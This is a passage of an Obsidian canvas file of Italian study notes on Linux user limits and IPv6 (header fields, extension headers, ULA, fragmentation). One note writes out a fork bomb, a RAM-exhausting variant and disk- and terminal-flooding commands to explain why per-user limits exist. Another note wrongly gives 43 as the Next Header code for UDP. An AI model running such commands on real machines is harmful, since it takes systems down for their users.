driver;\n- `user/` - ***Limiti*** globali per ciascun utente del sistema, tendenzialmente per impedire loro di fare danni, tipo ***DoSsare*** (volontariamente o meno) il sistema. Questo viene fatto impedendo di aprire troppi processi (***fork bomb***, bloccato dal parametro `ulimit`), file, mappature di memoria e simili. \n\t- Un modo molto semplice per implementare una fork bomb è `:(){ :|:& };:`, i.e.\n\t\t- `:()` definisce una funzione chiamata `:`;\n\t\t- `{ :|:& };` è il corpo della funzione, che chiama se stessa due volte in pipe, rimanendo in background;\n\t\t- `:` esegue la funzione appena definita e ne fa partire un numero esponenziale.\n\t- Una variante per esaurire la RAM e portare ad OOM è `:(){ x=$(yes); :|:& };:`, dove `yes` è una roba che stampa a spam \"`y\\n`\" (i.e. in pratica assegno in modo ricorsivo ad `N` variabili un gran quantitativo di memoria);\n\t\t- Se ti stai chiedendo per quale strano motivo esista un comando come `yes`, pare sia stato fatto per rispondere in automatico `y` ai comandi che richiedevano interazione umana per proseguire (e.g. `yes | fsck /dev/sda`, che chiede conferma per ogni errore trovato sul disco).\n\t- Posso poi saturare il disco con `yes > file.txt` o distruggere un terminale con `cat /dev/urandom > /dev/tty`. Insomma, ci sono molte cose che bisogna limitare quando parliamo di utenti.","x":-11592,"y":12588,"width":759,"height":1105,"color":"4"},
		{"id":"ba56104a8caea034","type":"text","text":"# Extension Headers\n\nL'`header` `IPv4` ha dimensione variabile a causa delle `options`. Con `IPv6` l'abbiamo reso a dimensione fissa, sempre `40 bytes` (tra le altre cose, così evito anche  di distinguere tra `header size` e `total size`). Questo perché il `99%` dei pacchetti non usava opzioni: `\"usiamo un protocollo semplice, complichiamo solo se serve\"`, dice `IPv6`.\n\n\"`Complichiamo se serve`\" ci fa capire che forse tutto sommato aveva un senso che il vecchio `header` avesse dimensione variabile. Il campo `Next Header` specifica in che modo interpretare i `40 byte` che seguono l'`header`, ma questo può essere tanto un `header` di un protocollo (e.g. `6 TCP`, `17 UDP`, `58 ICMPv6`) quanto un ***Extension Header***, i.e. un `header` contenente opzioni aggiuntive (al quale eventualmente ne segue un altro, e un altro, finché alla fine non si arriva all'`header` del protocollo di livello superiore).\n\nPer quanto detto, il `99%` dei pacchetti non avrà alcun `Extension Header`, ma in quell'`1%` c'è roba interessante:\n\n- \n\n\nquesta roba si legge solo end-to-end (a parte specifiche routing e hop-to-hop). in pratica solo gli edge processano le options, tutti gli altri router intermedi leggono una roba fissa e forwardano velocissimi.\n\n- routing permette di speciicare il path per la destinazione\n- ESP (encryption, usato per le VPN), AH (authentication, nessuno può modificare senza che il destinatario lo sappia, hash firmato con (la chiave del sender NO! PEERCHé NO???) con un message authentication code) serve per IPSec (implementarlo qui te lo applica su tutti i layer superiori).\n\t- spe forse MAC è hash crittato con chiave simmetrica\n- l'ordine delle options è importante (vedi slides). perché due volte destination? la seconda è crittata.","x":-12601,"y":16529,"width":759,"height":1011},
		{"id":"48669210c517d8c3","type":"text","text":"# Struttura di un Pacchetto `IPv6`\n\nL'`header IPv6` è molto più semplice di uno `IPv4`. Sono sempre `40 byte`, così divisi:\n\n- `Version` - `4 bit` per scrivere `0110` (i.e. il `6` di `IPv6`). Inaspettato, ve?\n- `Traffic Class` - `8 bit` per specificare il livello di ***priorità*** del pacchetto (e.g. `VoIP` ha priorità alta, perché deve garantire bassa latenza);\n- `Flow Label` - `20 bit` per identificare i ***flussi di traffico***, e.g. se tutti i pacchetti della mia connessione Netflix hanno la stessa label, il router non ha bisogno di arrivare a leggere la `Destination` e consultare la `Routing Table` (riduco l'overhead di calcolo);\n- `Payload Length` - `16 bit`, autoesplicativo;\n- `Next Header` - `8 bit` per specificare ai dissectors del layer superiore come leggere l'`header` incapsulato all'interno del payload (e.g. `6 = TCP`, `43 = UDP`);\n\t- Dal momento che non si usavano quasi mai, `IPv6` ha rimosso molte opzioni previste da `IPv4`. Se servono posso però aggiungerle in un secondo `header` che metto nel payload (e.g. `44` indica la presenza di un ***Extension Header*** che gestisce la frammentazione, `50` e `51` sono usati per implementare ***IPSec***).\n- `Hop Limit` - `8 bit`, è identico a `TTL` di `IPv4`;\n- `Source Address` - `128 bit`, autoesplicativo. È sempre un indirizzo ***unicast***;\n- `Destination Address` - `128 bit`, autoesplicativo. Può appartenere a qualsiasi classe.","x":-12601,"y":15788,"width":759,"height":557,"color":"4"},
		{"id":"016107f97361e51c","type":"text","text":"Posso richiedere ad Iliad e Fastweb un'intera rete IPv6 (utile per IoT?)","x":-17800,"y":15440,"width":476,"height":457},
		{"id":"90bac2cd5a15775d","type":"text","text":"# SPACING","x":-8311,"y":21772,"width":250,"height":235,"color":"5"},
		{"id":"478dab62989780f8","type":"text","text":"# ... e gli Unique Local?\n\nGli indirizzi ULA, essendo destinati solo all'uso locale e non instradabili globalmente, **non vengono tipicamente annunciati dai router negli RA insieme ai prefissi globali per l'autoconfigurazione SLAAC \"standard\"**. Il router di bordo non \"possiede\" un prefisso ULA da distribuire nel senso di un prefisso globale assegnato.\n\n**Come vengono configurati gli indirizzi ULA?**\n\nLa configurazione degli indirizzi ULA avviene in modo separato dalla configurazione dei GUA tramite RA/SLAAC. Ci sono principalmente due modi:\n\n1. **Configurazione Manuale o Tramite Script:** L'amministratore di rete può configurare manualmente gli indirizzi ULA sugli host o utilizzare script. Questo è meno comune per un gran numero di dispositivi.\n2. **DHCPv6:** Un server DHCPv6 può essere configurato per assegnare indirizzi ULA agli host sulla rete locale. Questa è la modalità più comune per distribuire indirizzi ULA in modo centralizzato. Un host richiederebbe un indirizzo ULA al server DHCPv6, in modo simile a come un client IPv4 richiede un indirizzo a un server DHCP.\n3. **Autoconfigurazione ULA (meno comune nello scenario RA/SLAAC per GUA):** Sebbene meno comune nello scenario di coexistenza con GUA tramite RA, tecnicamente un host potrebbe generare un prefisso ULA e un indirizzo ULA per sé, ma questo non è il meccanismo standard previsto dagli RA per la connettività globale.\n\n**L'ULA richiede comunque DAD?**\n\n**Assolutamente sì.** Indipendentemente da come un host ottiene il suo indirizzo ULA (manuale, DHCPv6, ecc.), è **essenziale** che l'host esegua il **Duplicate Address Detection (DAD)** per quell'indirizzo sul link locale prima di iniziare a utilizzarlo pienamente.\n\n**Perché?**\n\nAnche se gli indirizzi ULA sono progettati per essere globalmente unici per evitare collisioni tra reti private diverse, è comunque possibile (anche se molto improbabile con la generazione pseudorandomica di un prefisso) o, più realisticamente, a causa di errori di configurazione manuale o malfunzionamenti di un server DHCPv6, che due dispositivi sullo stesso link locale finiscano per tentare di utilizzare lo stesso indirizzo ULA.\n\nIl DAD per l'indirizzo ULA funziona esattamente come il DAD per l'indirizzo Link-Local o il GUA generato via SLAAC: l'host invia un messaggio Neighbor Solicitation (NS) per l'indirizzo ULA che intende utilizzare. Se un altro nodo sul link sta già usando quell'indirizzo, risponderà con un Neighbor Advertisement (NA), indicando il duplicato.","x":-16637,"y":14724,"width":759,"height":829,"color":"2"},
		{"id":"9aec27d0bef7f426","x":-11592,"y":15788,"width":762,"height":557,"type":"text","text":"# Checksum & Frammentazione\n\n`IPv6` toglie il checksum perché ci sono già fin troppi controlli di questo tipo (al livello MAC con `ethernet` e con il trasporto, sia `TCP` che `UDP`.\n\nInoltre la frammentazione deve essere gestita end-to-end. Se un router si ritrova a dover inoltrare un pacchetto grande `1000` su un link con `MTU = 500`, invece di frammentare butta il pacchetto e avvisa il mittente: `guarda che devi fare pacchetti grandi massimo 500 se vuoi passare da qui, io non farò questo lavoro per te`.\n\n\n\n\n"},
		{"id":"ae0f762d5fa6d78a","type":"text","text":"# SPACING","x":-17000,"y":16808,"width":250,"height":235,"color":"5"},
		{"id":"64606e2cd50fe644","type":"text","text":"# SPACING","x":-11560,"y":16529,"width":250,"height":235,"color":"5"}
	],
	"edges":[
		{"id":"428ec3c727bcfebf","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"8603be4ae948e472","toSide":"bottom"},
		{"id":"0f8ae08f684e1ba4","fromNode":"22dfa299c258426a","fromSide":"left","toNode":"4282f1f0f685c1b7","toSide":"right"},
		{"id":"3b8450f5d7d06324","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"eab759960ddcf808","toSide":"bottom"},
		{"id":"b97dacf49ed55fcb","fromNode":"0f2a36c9dcf84a3e","fromSide":"right","toNode":"7b351e91b16f865e","toSide":"left"},
		{"id":"1eec059325077352","fromNode":"7b351e91b16f865e","fromSide":"top","toNode":"22dfa299c258426a","toSide":"bottom","label":"How to get there?"},
		{"id":"cdbb7c68033e5b65","fromNode":"7b351e91b16f865e","fromSide":"bottom","toNode":"1cdecb81c364493b","toSide":"top","label":"Where am I?"},
		{"id":"c13c78293edc7b6d","fromNode":"7b351e91b16f865e","fromSide":"right","toNode":"ea0a31adef225299","toSide":"left"},
		{"id":"bda9d6a558058968","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"d8bd274b8f96df69","toSide":"bottom"},
		{"id":"3d3d010e414423c8","fromNode":"ea0a31adef225299","fromSide":"bottom","toNode":"04825a06a9d94d59","toSide":"top"},
		{"id":"6ba4b4daaae0441c","fromNode":"ea0a31adef225299","fromSide":"right","toNode":"625ede0e186681f5","toSide":"left"},
		{"id":"5359adb1693d9726","fromNode":"d8bd274b8f96df69","fromSide":"right","toNode":"4e494b0e134ff4a7","toSide":"left"},
		{"id":"f9071934d54f1998","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e5c67dbcd146b146","fromNode":"04825a06a9d94d59","fromSide":"bottom","toNode":"3d73dc291ec51cb6","toSide":"top"},
		{"id":"38de5c3f0b17d32d","fromNode":"3d73dc291ec51cb6","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"66a677d308a98e43","fromNode":"04825a06a9d94d59","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"c00a9d792bd09d56","fromNode":"efbeb23d6fccc658","fromSide":"bottom","toNode":"592cc115c760d58b","toSide":"top"},
		{"id":"4c7f78114b7c8129","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e3085dcdb384f960","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b008c9c94e60d49d","toSide":"bottom"},
		{"id":"5de8114eb7808ca7","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b3872fe16b478ecb","toSide":"bottom"},
		{"id":"620010ae0292ff42","fromNode":"b3872fe16b478ecb","fromSide":"top","toNode":"db8524057030a7aa","toSide":"bottom"},
		{"id":"30a1708adf9120a5","fromNode":"db8524057030a7aa","fromSide":"left","toNode":"1e4bdb54f9ff41bb","toSide":"right"},
		{"id":"7bbfe86e354e11ed","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9d6e1bc42fdc8fff","toSide":"left"},
		{"id":"b68568742b046ca0","fromNode":"9353a581758bae87","fromSide":"top","toNode":"9d6e1bc42fdc8fff","toSide":"bottom"},
		{"id":"14a1a2a060a23607","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9353a581758bae87","toSide":"left"},
		{"id":"3b09bf2c29cee2c5","fromNode":"db8524057030a7aa","fromSide":"top","toNode":"725abded725d4498","toSide":"bottom"},
		{"id":"ab9bccd43d4b692d","fromNode":"b008c9c94e60d49d","fromSide":"right","toNode":"2d903151dad0b196","toSide":"left"},
		{"id":"f20c7728e211c431","fromNode":"4e494b0e134ff4a7","fromSide":"right","toNode":"2e2f2fffcb29a514","toSide":"left"},
		{"id":"30acbdd63f807416","fromNode":"4e494b0e134ff4a7","fromSide":"bottom","toNode":"7be47aaf1eeeeb0d","toSide":"top"},
		{"id":"9b1ddf1a628d2da5","fromNode":"625ede0e186681f5","fromSide":"right","toNode":"19241c3faaf980ec","toSide":"left"},
		{"id":"16c1578973d5ed8d","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"2e2f2fffcb29a514","toSide":"bottom"},
		{"id":"a11cccead9f2dfe0","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"d6df1ebc088bc55b","toSide":"top"},
		{"id":"3f43813ae6dda381","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"fde5e59d70e6ddbe","toSide":"top"},
		{"id":"97e49f4ab1d118a3","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"28c7fa5a4a2add1f","toSide":"top"},
		{"id":"3e74ea0b969c67d7","fromNode":"28c7fa5a4a2add1f","fromSide":"bottom","toNode":"09449e1e2bf4e019","toSide":"top"},
		{"id":"f0318b1cdc3881bc","fromNode":"19241c3faaf980ec","fromSide":"right","toNode":"22b8634d71376455","toSide":"left"},
		{"id":"00741801b9d873d6","fromNode":"2e2f2fffcb29a514","fromSide":"right","toNode":"df5e2abc8ea4b780","toSide":"left"},
		{"id":"66c11ba53c554d96","fromNode":"22b8634d71376455","fromSide":"top","toNode":"3565595bf897b446","toSide":"bottom"},
		{"id":"05456b6d30048acb","fromNode":"22b8634d71376455","fromSide":"top","toNode":"603628298b4df9a2","toSide":"bottom"},
		{"id":"7dd25d49892a4964","fromNode":"d6df1ebc088bc55b","fromSide":"right","toNode":"0e6f99d9025a7954","toSide":"left"},
		{"id":"d82539944e94e697","fromNode":"22b8634d71376455","fromSide":"top","toNode":"c77fc76ca3f24940","toSide":"bottom"},
		{"id":"56fd97094b3cb634","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"5cce19db2eacb68d","toSide":"bottom"},
		{"id":"9591b59f3b3be6dc","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"ea6a4509f0ba551c","toSide":"bottom"},
		{"id":"448ea8b3e69ae08a","fromNode":"22b8634d71376455","fromSide":"bottom","toNode":"0e6f99d9025a7954","toSide":"top"},
		{"id":"d5b173cc1ea1a05f","fromNode":"6033fbd5014b0cba","fromSide":"bottom","toNode":"e5fc1848775e11e1","toSide":"top"},
		{"id":"5cda0cd9571b9d0a","fromNode":"0f2a36c9dcf84a3e","fromSide":"left","toNode":"e660a0288c5cee37","toSide":"right"},
		{"id":"6d86ee83c255b737","fromNode":"e218e0589f82e95a","fromSide":"top","toNode":"0f2a36c9dcf84a3e","toSide":"bottom"},
		{"id":"87735d418c09fb25","fromNode":"e660a0288c5cee37","fromSide":"left","toNode":"c61155df72f8f47a","toSide":"right"},
		{"id":"386d6a68c92c107b","fromNode":"e660a0288c5cee37","fromSide":"bottom","toNode":"f4f2a29153e51075","toSide":"top"},
		{"id":"59c22fe6415ef2b2","fromNode":"0f2a36c9dcf84a3e","fromSide":"left","toNode":"f4f2a29153e51075","toSide":"right"},
		{"id":"6da1470c749a896e","fromNode":"c61155df72f8f47a","fromSide":"bottom","toNode":"430d8b04ba92b85a","toSide":"top"},
		{"id":"519ba9f70daa64c7","fromNode":"d8bd274b8f96df69","fromSide":"top","toNode":"26065c6695f63b89","toSide":"bottom"},
		{"id":"33a4a2d848107c08","fromNode":"26065c6695f63b89","fromSide":"right","toNode":"b3872fe16b478ecb","toSide":"left"},
		{"id":"91e29291668527bf","fromNode":"26065c6695f63b89","fromSide":"left","toNode":"52300a2aca6a3d2b","toSide":"right"},
		{"id":"98012f482a86c47c","fromNode":"26065c6695f63b89","fromSide":"left","toNode":"049e5ead3118c000","toSide":"right"},
		{"id":"187e71ec766b8131","fromNode":"4f8240ee05d14bd3","fromSide":"right","toNode":"ef01ecee9344c97a","toSide":"left"},
		{"id":"d6b4994faf243a57","fromNode":"4f8240ee05d14bd3","fromSide":"right","toNode":"62d77e93a738633d","toSide":"left"},
		{"id":"091bc551d731a0de","fromNode":"72d78acc98f57a75","fromSide":"right","toNode":"57a7f3f226adc78b","toSide":"left"},
		{"id":"879ef12524891c88","fromNode":"72d78acc98f57a75","fromSide":"right","toNode":"d76be3d4d10ad0c4","toSide":"left"},
		{"id":"12ef2def5944f62a","fromNode":"72d78acc98f57a75","fromSide":"left","toNode":"3ce011a34d648316","toSide":"right"},
		{"id":"0261c436dd6e5452","fromNode":"1f7d268a16eedc89","fromSide":"bottom","toNode":"9ef9565d73660350","toSide":"top"},
		{"id":"068c1dad3a05ba5c","fromNode":"72d78acc98f57a75","fromSide":"top","toNode":"99ef27d883dac209","toSide":"bottom"},
		{"id":"821a8b0858ea3b78","fromNode":"72d78acc98f57a75","fromSide":"left","toNode":"52fa94b909771d9b","toSide":"right"},
		{"id":"61fb6af28608a35a","fromNode":"fc31d285a8ba2ad3","fromSide":"top","toNode":"72d78acc98f57a75","toSide":"bottom"},
		{"id":"b45f06e4633b61fa","fromNode":"fc31d285a8ba2ad3","fromSide":"left","toNode":"1f7d268a16eedc89","toSide":"right"},
		{"id":"7d3163884c6ad53d","fromNode":"a35f9569f0925a3a","fromSide":"top","toNode":"fc31d285a8ba2ad3","toSide":"bottom"},
		{"id":"8f7ccb835002cf3c","fromNode":"bbd22089bc42007f","fromSide":"right","toNode":"9290043c9f3df071","toSide":"left"},
		{"id":"9f79a9baa75f162a","fromNode":"bbd22089bc42007f","fromSide":"right","toNode":"9b371b4161e579d9","toSide":"left"},
		{"id":"0c18907de10d5823","fromNode":"48960e7373f05723","fromSide":"right","toNode":"bbd22089bc42007f","toSide":"left"},
		{"id":"7a1fdb8856fe5b8b","fromNode":"7a683155fe19cadc","fromSide":"right","toNode":"a0722c7f81126360","toSide":"left"},
		{"id":"3d5a6c890f9a4714","fromNode":"7a683155fe19cadc","fromSide":"top","toNode":"5e078390c80df780","toSide":"bottom"},
		{"id":"17f9ad3245550f33","fromNode":"8d45a43704e34f6f","fromSide":"right","toNode":"7a683155fe19cadc","toSide":"left"},
		{"id":"f6fbeb91e1525096","fromNode":"8d45a43704e34f6f","fromSide":"top","toNode":"39fe9d808700246c","toSide":"bottom"},
		{"id":"ca048ccd260824d6","fromNode":"9314d10e8c398b40","fromSide":"right","toNode":"8d45a43704e34f6f","toSide":"left"},
		{"id":"cacd4da7dc337b83","fromNode":"48960e7373f05723","fromSide":"bottom","toNode":"5b890feef7056429","toSide":"top"},
		{"id":"84ef2bddc4835adc","fromNode":"9314d10e8c398b40","fromSide":"right","toNode":"48960e7373f05723","toSide":"left"},
		{"id":"41ea127f7f322570","fromNode":"9314d10e8c398b40","fromSide":"top","toNode":"39fe9d808700246c","toSide":"left"},
		{"id":"9497ab9c7fb19e6c","fromNode":"99ef27d883dac209","fromSide":"right","toNode":"9314d10e8c398b40","toSide":"left"},
		{"id":"445d82cc51950a8b","fromNode":"99ef27d883dac209","fromSide":"top","toNode":"08f3eea3d4feef51","toSide":"bottom"},
		{"id":"3ba07eb4a5e2f443","fromNode":"52fa94b909771d9b","fromSide":"top","toNode":"99ef27d883dac209","toSide":"left"},
		{"id":"2cb65c16a553f923","fromNode":"39fe9d808700246c","fromSide":"right","toNode":"5e078390c80df780","toSide":"left"},
		{"id":"58514f9200ca0636","fromNode":"53ab523aeef9ec9a","fromSide":"top","toNode":"a35f9569f0925a3a","toSide":"bottom"},
		{"id":"cc1dd43fc6c4dce9","fromNode":"c43c09b5a27c6f80","fromSide":"left","toNode":"c458828e446d076f","toSide":"right"},
		{"id":"e919319d970645e8","fromNode":"28ffaf4f75ea584b","fromSide":"bottom","toNode":"c43c09b5a27c6f80","toSide":"top"},
		{"id":"ce47cf5872b7ba15","fromNode":"c43c09b5a27c6f80","fromSide":"bottom","toNode":"2d824d6131fce094","toSide":"top"},
		{"id":"cd81e7ba509b6590","fromNode":"2d824d6131fce094","fromSide":"left","toNode":"e214ed120d45c08a","toSide":"right","label":"ex1"},
		{"id":"3bd9a499c1fff3c5","fromNode":"2d824d6131fce094","fromSide":"right","toNode":"6f55ee57ba880979","toSide":"left"},
		{"id":"437095f8727d1c35","fromNode":"2d824d6131fce094","fromSide":"bottom","toNode":"a9d3163314090aa4","toSide":"top"},
		{"id":"3a528dc51e70fb17","fromNode":"a9d3163314090aa4","fromSide":"left","toNode":"d3263c1925ddb36c","toSide":"right"},
		{"id":"e782cc1e3704b1c8","fromNode":"2d824d6131fce094","fromSide":"left","toNode":"cb14f5abb112f7a1","toSide":"right","label":"ex2"},
		{"id":"90791a8c3cf58093","fromNode":"6f55ee57ba880979","fromSide":"right","toNode":"394c80713ed11e62","toSide":"left"},
		{"id":"1cdda1e1f1efeaee","fromNode":"394c80713ed11e62","fromSide":"right","toNode":"9c512660e25af682","toSide":"left"},
		{"id":"e39a65fa10daeb49","fromNode":"780a7728bf920c66","fromSide":"left","toNode":"e0222f3875abd212","toSide":"right"},
		{"id":"e80e8c128cda676c","fromNode":"2d824d6131fce094","fromSide":"right","toNode":"e0222f3875abd212","toSide":"left"},
		{"id":"da83158f5beef21a","fromNode":"394c80713ed11e62","fromSide":"bottom","toNode":"780a7728bf920c66","toSide":"top"},
		{"id":"41253b0f510a1389","fromNode":"780a7728bf920c66","fromSide":"right","toNode":"9aab84f55bbcd7b5","toSide":"left"},
		{"id":"9fc5e1b55e30c1bf","fromNode":"780a7728bf920c66","fromSide":"bottom","toNode":"9d40d5615a7f5616","toSide":"top"},
		{"id":"f911f5c672a4c555","fromNode":"d3263c1925ddb36c","fromSide":"left","toNode":"920967296878cb3a","toSide":"right"},
		{"id":"2d0496553508a897","fromNode":"d3263c1925ddb36c","fromSide":"bottom","toNode":"acbfb7d40b4eec22","toSide":"top"},
		{"id":"7ce4883072afe6cd","fromNode":"920967296878cb3a","fromSide":"left","toNode":"1d0acbc9119f8702","toSide":"right"},
		{"id":"a2b2ee664aa76fd1","fromNode":"920967296878cb3a","fromSide":"bottom","toNode":"a3f0b1fb4d585e4d","toSide":"top"},
		{"id":"7eb783f8facf0282","fromNode":"1d0acbc9119f8702","fromSide":"bottom","toNode":"a3f0b1fb4d585e4d","toSide":"top"},
		{"id":"2e675a222330d7fd","fromNode":"920967296878cb3a","fromSide":"top","toNode":"9a31e35de575334d","toSide":"bottom"},
		{"id":"2bcc927b2a8939aa","fromNode":"1d0acbc9119f8702","fromSide":"top","toNode":"829e7a360cd16a1f","toSide":"bottom"},
		{"id":"afc04eed0afd1351","fromNode":"d3263c1925ddb36c","fromSide":"bottom","toNode":"48669210c517d8c3","toSide":"top"},
		{"id":"261501be03d3f9df","fromNode":"829e7a360cd16a1f","fromSide":"top","toNode":"9044be12381dd874","toSide":"left","fromEnd":"arrow"},
		{"id":"f0aa0b0de9676d0c","fromNode":"920967296878cb3a","fromSide":"top","toNode":"62c18499ff705672","toSide":"bottom"},
		{"id":"8fd58da19c2b3374","fromNode":"48669210c517d8c3","fromSide":"bottom","toNode":"ba56104a8caea034","toSide":"top"},
		{"id":"aa3ec98b05e87c96","fromNode":"9aab84f55bbcd7b5","fromSide":"right","toNode":"20ce16025e72707f","toSide":"left"},
		{"id":"9161ff6ec96d2251","fromNode":"e0222f3875abd212","fromSide":"bottom","toNode":"5ddd43db34c02b27","toSide":"top"},
		{"id":"7bcea828b8a23baf","fromNode":"2d824d6131fce094","fromSide":"bottom","toNode":"5ddd43db34c02b27","toSide":"top","label":"ex3+"},
		{"id":"1ad29deea1d12b5b","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"3e59a8434e7f1e95","toSide":"bottom"},
		{"id":"30670804e7ef738c","fromNode":"a9d3163314090aa4","fromSide":"right","toNode":"ef928ca5c1df8fca","toSide":"left"},
		{"id":"c5672d23803c6052","fromNode":"a9d3163314090aa4","fromSide":"right","toNode":"d2e5012a14662899","toSide":"left"},
		{"id":"fd577654d40c9593","fromNode":"c61155df72f8f47a","fromSide":"left","toNode":"6c0d3669627386fe","toSide":"right"},
		{"id":"b02e9852d4caeab8","fromNode":"2d824d6131fce094","fromSide":"bottom","toNode":"676c67e7ed61abe7","toSide":"top","label":"ex4"},
		{"id":"c000928ea2fc27b1","fromNode":"58ca04dd8eff3556","fromSide":"left","toNode":"52efa23b596ae1eb","toSide":"right"},
		{"id":"5267f663577f2bab","fromNode":"58ca04dd8eff3556","fromSide":"left","toNode":"ca3cf448e10d4a7f","toSide":"right"},
		{"id":"18ee1c6f7742ad52","fromNode":"676c67e7ed61abe7","fromSide":"left","toNode":"58ca04dd8eff3556","toSide":"right"},
		{"id":"98935850952fdf44","fromNode":"58ca04dd8eff3556","fromSide":"top","toNode":"4aa8b654f9a7feaa","toSide":"bottom"},
		{"id":"52d53a73aacf9139","fromNode":"1d0acbc9119f8702","fromSide":"bottom","toNode":"faa7a7d081f0062d","toSide":"top"},
		{"id":"7c10bd0bd1826815","fromNode":"a9d3163314090aa4","fromSide":"top","toNode":"eb599150771640c2","toSide":"bottom","label":"ex2"},
		{"id":"16d5f12036de063b","fromNode":"5ddd43db34c02b27","fromSide":"bottom","toNode":"9f5441a3edad0cc9","toSide":"top"},
		{"id":"081736bce50457ad","fromNode":"a9d3163314090aa4","fromSide":"bottom","toNode":"99000e11f7a10da1","toSide":"top"},
		{"id":"f5605230de001b89","fromNode":"99000e11f7a10da1","fromSide":"bottom","toNode":"9c265ba29c9c5e68","toSide":"top"},
		{"id":"f60868a529219af8","fromNode":"99000e11f7a10da1","fromSide":"right","toNode":"24329f55583836be","toSide":"left"},
		{"id":"d9f0042f7230c951","fromNode":"4aa8b654f9a7feaa","fromSide":"top","toNode":"2e6fc09bc131f5f0","toSide":"bottom"},
		{"id":"70736b5afda97db1","fromNode":"2e6fc09bc131f5f0","fromSide":"top","toNode":"75d22476aa1bc441","toSide":"bottom"},
		{"id":"d8296cce1ef77669","fromNode":"2e6fc09bc131f5f0","fromSide":"top","toNode":"9b0ccd7a1f5d0648","toSide":"bottom"},
		{"id":"a58027b6b8652924","fromNode":"75d22476aa1bc441","fromSide":"left","toNode":"9b0ccd7a1f5d0648","toSide":"right"},
		{"id":"6d4d1b653e64a188","fromNode":"75d22476aa1bc441","fromSide":"top","toNode":"24b1c4b94d6c7930","toSide":"bottom"},
		{"id":"424e32e56e8dc648","fromNode":"2e6fc09bc131f5f0","fromSide":"left","toNode":"4c353e5b44b691db","toSide":"right"},
		{"id":"4644f9b6ae105f6f","fromNode":"4aa8b654f9a7feaa","fromSide":"left","toNode":"8124f5c080607f2b","toSide":"right"},
		{"id":"639becde9c1df4e5","fromNode":"2e6fc09bc131f5f0","fromSide":"bottom","toNode":"8124f5c080607f2b","toSide":"top"},
		{"id":"2bd5845d31d9520a","fromNode":"eb599150771640c2","fromSide":"left","toNode":"0654efafad655f4a","toSide":"right"},
		{"id":"3f2ab6461486247c","fromNode":"e660a0288c5cee37","fromSide":"top","toNode":"84fe8493ed579e54","toSide":"bottom"},
		{"id":"4421d3fa5c20dad6","fromNode":"1d0acbc9119f8702","fromSide":"left","toNode":"478dab62989780f8","toSide":"right"},
		{"id":"5c452b978c2aceeb","fromNode":"62c18499ff705672","fromSide":"top","toNode":"9044be12381dd874","toSide":"bottom"},
		{"id":"29037a43c7149de2","fromNode":"48669210c517d8c3","fromSide":"right","toNode":"9aec27d0bef7f426","toSide":"left"}
	]
}